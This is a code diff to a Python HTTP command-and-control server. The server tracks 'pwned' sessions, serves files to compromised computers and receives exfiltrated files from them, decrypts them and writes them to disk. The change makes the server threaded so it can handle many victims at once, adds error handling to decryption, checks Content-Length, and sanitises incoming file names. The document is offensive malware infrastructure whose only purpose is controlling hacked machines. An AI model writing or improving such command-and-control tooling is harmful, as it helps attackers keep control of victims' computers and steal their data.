@@ -1,8 +1,8 @@
 # Command and Control server code
 
-from http import server
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from os import mkdir, path
+from socketserver import ThreadingMixIn
 from urllib.parse import unquote_plus
 from inputimeout import inputimeout, TimeoutOccurred
 from encryption import cipher
@@ -46,6 +46,10 @@ def get_new_session():
                 print("You must choose a pwned id of one of the sessions shown on the screen.\n")
                 continue
 
+class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
+    """Handle requests in a separate thread."""
+    daemon_threads = True
+
 class C2Handler(BaseHTTPRequestHandler):
     """This is a child class of the BaseHTTPRequestHandler class.
     It handles all HTTP requests that arrive at the c2 server."""
@@ -69,7 +73,12 @@ class C2Handler(BaseHTTPRequestHandler):
             client = self.path.split(CMD_REQUEST)[1]
 
             # Encode the client data because decrypt requires it, then decrypt, then decode
-            client = cipher.decrypt(client.encode()).decode()
+            try:
+                client = cipher.decrypt(client.encode()).decode()
+            except Exception:
+                print(f"Failed to decrypt client identifier from {self.path}\n")
+                self.http_response(400)
+                return
 
             # Split out the client account name
             client_account = client.split("@")[0]
@@ -135,8 +144,13 @@ class C2Handler(BaseHTTPRequestHandler):
             # Split out the encrypted filepath from the HTTP GET request
             filepath = self.path.split(FILE_REQUEST)[1]
 
-            # Encode the filepath becouse decrypt requires it, then decrypt, then decode
-            filepath = cipher.decrypt(filepath.encode()).decode()
+            # Encode the filepath because decrypt requires it, then decrypt, then decode
+            try:
+                filepath = cipher.decrypt(filepath.encode()).decode()
+            except Exception:
+                print(f"Failed to decrypt filepath from {self.path}\n")
+                self.http_response(400)
+                return
 
             # Read the requested file into memory and stream it back for client's GET response
             try:
@@ -175,29 +189,42 @@ class C2Handler(BaseHTTPRequestHandler):
 
         # Follow this code block when the compromised computer is sending the server a file
         if self.path.startswith(FILE_SEND + "/"):
+
+            # Check for Content-Length header before processing
+            content_length = self.headers.get("Content-Length")
+            if not content_length:
+                print("Missing Content-Length header in PUT request")
+                self.http_response(400)
+                return
+
             self.http_response(200)
 
             # Split out the encrypted filename from the HTTP PUT request
-            filename = self.path.split(FILE_SEND + "/")[1]
-
-            print("filename before decryption", filename)
+            encrypted_filename = self.path.split(FILE_SEND + "/")[1]
 
             # Encode the filename because decrypt requires it, then decrypt, then decode
-            filename = cipher.decrypt(filename.encode()).decode()
+            try:
+                filename = cipher.decrypt(encrypted_filename.encode()).decode()
+            except Exception:
+                print(f"Failed to decrypt filename from {self.path}")
+                return
 
-            print("filename after decryption", filename)
+            # Sanitize filename to prevent path traversal attacks
+            filename = path.basename(filename)
 
             # This adds the file name to our storage path
-            incoming_file = STORAGE + "/" + filename
-
-            print(incoming_file)
+            incoming_file = path.join(STORAGE, filename)
 
             # We need the content length to properly read in the file
-            file_length = int(self.headers["Content-Length"])
+            file_length = int(content_length)
 
             # Read the file stream, decrypt it, and then write to disk
             with open(incoming_file, "wb") as file_handle:
-                file_handle.write(cipher.decrypt(self.rfile.read(file_length)))
+                raw_data = self.rfile.read(file_length)
+                try:
+                    file_handle.write(cipher.decrypt(raw_data))
+                except Exception:
+                    print(f"Failed to decrypt incoming file data for {incoming_file}")
             print(f"{incoming_file} has been written to the c2 server.")
 
         # Nobody should ever be accessing to our c2 server using HTTP PUT
@@ -209,11 +236,17 @@ class C2Handler(BaseHTTPRequestHandler):
     def handle_post_data(self):
         """ Function to handle post data from a client. """
 
+        # Check for Content-Length header before processing
+        content_length = self.headers.get("Content-Length")
+        if not content_length:
+            print("Missing Content-Length header in POST request")
+            return ""
+
         # Sends the HTTP response code and header back to the client
         self.http_response(200)
 
         # Get Content-Length value from HTTP Headers
-        content_length = int(self.headers.get("Content-Length"))
+        content_length = int(content_length)
 
         # Gather the client's data by reading in the HTTP POST data
         client_data = self.rfile.read(content_length)
@@ -228,7 +261,11 @@ class C2Handler(BaseHTTPRequestHandler):
         client_data = unquote_plus(client_data)
 
         # Encode the client data because decrypt requires it, then decrypt, then decode
-        client_data = cipher.decrypt(client_data.encode()).decode()
+        try:
+            client_data = cipher.decrypt(client_data.encode()).decode()
+        except Exception:
+            print("Failed to decrypt POST data")
+            return ""
 
         # Return the processed client's data
         return client_data
@@ -243,7 +280,7 @@ class C2Handler(BaseHTTPRequestHandler):
         to the screen. Our doesn't log any successful connections; it just returns, which is what we want. """
         return
 
-# This maps to the client that we have a promt for
+# This maps to the client that we have a prompt for
 active_session = 1
 
 # This is the current working directory from the client belonging to the active session
@@ -265,8 +302,8 @@ pwned_dict = {}
 if not path.isdir(STORAGE):
     mkdir(STORAGE)
 
-# Instantiate oour HTTPServer object
-server = HTTPServer((BIND_ADDR, PORT), C2Handler)
+# Instantiate our HTTPServer object (threaded to handle concurrent clients)
+server = ThreadedHTTPServer((BIND_ADDR, PORT), C2Handler)
 
 # Run the server in an infinite loop
 server.serve_forever()
